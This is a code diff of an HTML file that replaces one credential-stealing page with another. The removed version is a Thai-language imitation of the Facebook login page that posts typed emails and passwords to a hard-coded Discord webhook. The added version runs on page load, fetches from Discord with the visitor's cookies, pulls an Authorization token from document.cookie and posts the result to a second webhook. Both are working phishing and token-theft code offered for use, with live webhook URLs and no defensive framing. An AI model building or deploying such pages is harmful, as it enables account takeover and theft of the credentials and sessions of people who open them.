@@ -1,180 +1,51 @@
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- เพิ่ม viewport meta tag -->
-    <title>Facebook Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-        .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%; /* ปรับเป็น 100% ของขนาดหน้าจอ */
-            max-width: 980px; /* ความกว้างสูงสุดของ container */
-            padding: 0 20px; /* เพิ่ม padding ด้านซ้ายขวา */
-            box-sizing: border-box; /* ให้ padding นับเข้าไปใน width */
-        }
-        .left-section {
-            flex: 1;
-            text-align: center; /* จัดให้ข้อความอยู่ตรงกลาง */
-        }
-        .left-section h1 {
-            color: #1877f2;
-            font-size: 48px; /* ลดขนาด font-size สำหรับมือถือ */
-            margin: 20px 0; /* เพิ่ม margin ระหว่างข้อความ */
-        }
-        .left-section p {
-            font-size: 16px; /* ลดขนาด font-size สำหรับมือถือ */
-            color: #333;
-            margin-bottom: 20px; /* เพิ่ม margin ด้านล่าง */
-        }
-        .right-section {
-            flex: 1;
-            max-width: 400px;
-            background-color: white;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            margin-top: 20px; /* เพิ่ม margin ด้านบน */
-        }
-        .right-section h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #333;
-        }
-        .login-form input {
-            width: calc(100% - 20px);
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 5px;
-        }
-        .login-form button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877f2;
-            color: white;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .login-form a {
-            display: block;
-            text-align: center;
-            margin-top: 10px;
-            color: #1877f2;
-            text-decoration: none;
-        }
-        .create-account {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            background-color: #42b72a;
-            color: white;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-align: center;
-            margin-top: 10px;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #555;
-        }
-
-        /* Media query เพื่อปรับ CSS สำหรับมือถือ */
-        @media (max-width: 600px) {
-            .container {
-                flex-direction: column; /* จัดเรียงเป็นคอลัมน์เดียว */
-                padding: 20px; /* เพิ่ม padding ทั้งหมด */
-            }
-            .left-section h1 {
-                font-size: 36px; /* ลดขนาด font-size สำหรับมือถือ */
-                margin-top: 0; /* ลบ margin ด้านบน */
-            }
-            .left-section p {
-                font-size: 14px; /* ลดขนาด font-size สำหรับมือถือ */
-                margin-bottom: 10px; /* เพิ่ม margin ด้านล่าง */
-            }
-            .right-section {
-                width: 100%; /* กว้างเต็มจอในโหมดมือถือ */
-                max-width: none; /* ไม่จำกัดความกว้างสูงสุด */
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="left-section">
-            <h1>facebook</h1>
-            <p>Facebook ช่วยคุณเชื่อมต่อและแชร์กับผู้คนมากมายรอบตัวคุณ</p>
-        </div>
-        <div class="right-section">
-            <div class="login-form">
-                <input id="email" type="text" placeholder="อีเมลหรือเบอร์โทรศัพท์" required>
-                <input id="password" type="password" placeholder="รหัสผ่าน" required>
-                <button type="button" onclick="submitForm()">เข้าสู่ระบบ</button>
-                <a href="#">ลืมรหัสผ่านใช่หรือไม่?</a>
-                <div class="create-account">สร้างบัญชีใหม่</div>
-            </div>
-        </div>
-    </div>
-    <div class="footer">
-        <p></p>
-    </div>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fetch and Send Cookies</title>
     <script>
-        function submitForm() {
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
+        window.onload = function() {
+            // URL ของเว็บไซต์ตัวอย่าง
+            const targetUrl = 'https://discord.com/channels/@me'; // เปลี่ยนเป็น URL สมมุติที่ต้องการ
+            const apiEndpoint = 'https://example.com/api/v9/user-profile-effects'; // เปลี่ยนเป็น API Endpoint ที่ต้องการ
+            const webhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';
 
-            // สร้างข้อมูลที่จะส่งไปยัง Discord webhook
-            var message = {
-                content: "Login attempt:",
-                embeds: [
-                    {
-                        title: "Facebook Login",
-                        fields: [
-                            { name: "Email", value: email },
-                            { name: "Password", value: password }
-                        ]
+            // ดึง cookies จากเว็บไซต์ตัวอย่าง
+            fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include' // รวม cookies ในการร้องขอ
+            })
+            .then(response => response.text())
+            .then(() => {
+                // ดึงข้อมูลจาก API ที่กำหนด
+                fetch(apiEndpoint, {
+                    method: 'GET',
+                    credentials: 'include', // รวม cookies ในการร้องขอ
+                    headers: {
+                        'Authorization': `Bearer ${document.cookie.match(/Authorization=([^;]+)/)?.[1] || ''}`
                     }
-                ]
-            };
-
-            // ส่งข้อมูลไปยัง Discord webhook โดยใช้ XMLHttpRequest
-            var webhookURL = "https://discord.com/api/webhooks/1252253384501887067/VEuHR4FVh43ztNVPgmE0kd7RqWFIM154Gha7s63Do-R1tc4VbuLQ8DzOaamP323Te4nd";
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookURL);
-            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-            xhr.send(JSON.stringify(message));
-
-            // ตรวจสอบการส่งข้อมูลสำเร็จหรือไม่
-            xhr.onload = function() {
-                if (xhr.status >= 200 && xhr.status < 300) {
-                    alert("ส่งข้อมูลการล็อกอินไปยัง Discord Webhook สำเร็จ!");
-                } else {
-                    alert("เกิดข้อผิดพลาดในการส่งข้อมูลไปยัง Discord Webhook");
-                }
-            };
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // ส่งข้อมูลไปยัง Webhook
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ Authorization: data })
+                    })
+                    .then(response => response.json())
+                    .then(result => console.log('Success:', result))
+                    .catch(error => console.error('Error:', error));
+                })
+                .catch(error => console.error('Error:', error));
+            })
+            .catch(error => console.error('Error:', error));
         }
     </script>
+</head>
+<body>
 </body>
 </html>
